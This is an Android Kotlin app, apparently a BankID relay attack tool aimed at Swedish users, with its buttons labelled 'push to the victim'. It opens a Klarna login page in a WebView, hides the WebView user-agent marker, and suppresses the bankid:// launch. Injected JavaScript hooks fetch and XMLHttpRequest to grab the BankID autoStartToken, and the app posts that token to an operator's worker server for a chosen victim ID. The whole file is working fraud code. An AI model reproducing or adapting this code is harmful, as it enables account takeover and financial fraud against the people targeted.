package se.ditt.relay

import android.annotation.SuppressLint
import android.app.Activity
import android.os.Bundle
import android.view.ViewGroup.LayoutParams.MATCH_PARENT
import android.view.ViewGroup.LayoutParams.WRAP_CONTENT
import android.webkit.*
import android.widget.*
import org.json.JSONObject
import java.io.PrintWriter
import java.io.StringWriter
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : Activity() {

    private lateinit var web: WebView
    private lateinit var api: EditText
    private lateinit var victim: EditText
    private lateinit var service: EditText
    private lateinit var addr: EditText
    private lateinit var push: Button
    private var token: String? = null

    private val prefs by lazy { getSharedPreferences("relay", MODE_PRIVATE) }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        try {
            build()
        } catch (e: Throwable) {
            showError(e)
        }
    }

    private fun build() {
        api = EditText(this).apply { hint = "worker-adress" }
        victim = EditText(this).apply { hint = "offer-id" }
        service = EditText(this).apply { hint = "tjänstens namn" }
        addr = EditText(this).apply { hint = "adress till tjänsten" }
        push = Button(this).apply {
            text = "Pusha till offret"
            isEnabled = false
            setOnClickListener { send() }
        }
        val go = Button(this).apply {
            text = "Gå"
            setOnClickListener { load() }
        }

        web = WebView(this)

        api.setText(prefs.getString("api", BuildConfig.WORKER_URL))
        victim.setText(prefs.getString("victim", ""))
        service.setText(prefs.getString("service", "Tjänsten"))
        addr.setText(prefs.getString("addr", START))

        val row1 = LinearLayout(this).apply { orientation = LinearLayout.HORIZONTAL }
        row1.addView(api, LinearLayout.LayoutParams(0, WRAP_CONTENT, 1.5f))
        row1.addView(victim, LinearLayout.LayoutParams(0, WRAP_CONTENT, 1f))

        val row2 = LinearLayout(this).apply { orientation = LinearLayout.HORIZONTAL }
        row2.addView(addr, LinearLayout.LayoutParams(0, WRAP_CONTENT, 1f))
        row2.addView(go, LinearLayout.LayoutParams(WRAP_CONTENT, WRAP_CONTENT))

        val root = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        root.addView(row1, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))
        root.addView(service, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))
        root.addView(row2, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))
        root.addView(push, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))
        root.addView(web, LinearLayout.LayoutParams(MATCH_PARENT, 0, 1f))
        setContentView(root)

        web.settings.javaScriptEnabled = true
        web.settings.domStorageEnabled = true

        val ua = web.settings.userAgentString
        if (ua != null) web.settings.userAgentString = ua.replace("; wv", "")

        CookieManager.getInstance().setAcceptThirdPartyCookies(web, true)

        web.addJavascriptInterface(Bridge(), "relay")
        web.webViewClient = object : WebViewClient() {
            override fun onPageFinished(v: WebView, u: String) {
                v.evaluateJavascript(HOOK, null)
            }
            override fun shouldOverrideUrlLoading(
                v: WebView, r: WebResourceRequest
            ): Boolean = r.url.scheme == "bankid"
        }

        load()
    }

    private fun load() {
        val u = addr.text.toString().trim()
        prefs.edit().putString("addr", u).apply()
        web.loadUrl(u)
    }

    private fun showError(e: Throwable) {
        val sw = StringWriter()
        e.printStackTrace(PrintWriter(sw))
        val tv = TextView(this)
        tv.textSize = 10f
        tv.setPadding(30, 30, 30, 30)
        tv.text = "FEL\n\n" + sw.toString()
        setContentView(tv)
    }

    inner class Bridge {
        @JavascriptInterface
        fun onToken(t: String) {
            token = t
            runOnUiThread {
                push.isEnabled = true
                push.text = "Pusha till offret  ✓"
            }
        }
    }

    private fun send() {
        val t = token ?: return
        val base = api.text.toString().trim().trimEnd('/')
        val id = victim.text.toString().trim()
        val svc = service.text.toString().ifBlank { "Tjänsten" }

        prefs.edit()
            .putString("api", base)
            .putString("victim", id)
            .putString("service", svc)
            .apply()

        push.isEnabled = false
        push.text = "Skickar…"

        Thread {
            try {
                val body = JSONObject()
                    .put("state", "ready")
                    .put("service", svc)
                    .put("token", t)
                    .toString()

                val c = URL("$base/push/$id")
                    .openConnection() as HttpURLConnection
                c.requestMethod = "POST"
                c.doOutput = true
                c.setRequestProperty("Content-Type", "application/json")
                c.outputStream.use { it.write(body.toByteArray()) }
                c.responseCode

                runOnUiThread {
                    push.text = "Pushat ✓  $svc"
                    token = null
                }
            } catch (e: Exception) {
                runOnUiThread {
                    push.text = "Fel: " + e.message
                    push.isEnabled = true
                }
            }
        }.start()
    }

    companion object {
        private const val START = "https://www.klarna.com/se/logga-in"

        private const val HOOK = """
(function () {
  function scan(txt) {
    var m = txt.match(/"autoStartToken"\s*:\s*"([^"]+)"/);
    if (m) window.relay.onToken(m[1]);
  }
  var of = window.fetch;
  window.fetch = function () {
    return of.apply(this, arguments).then(function (r) {
      r.clone().text().then(scan);
      return r;
    });
  };
  var os = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function () {
    this.addEventListener("load", function () { scan(this.responseText); });
    return os.apply(this, arguments);
  };
})();
"""
    }
}
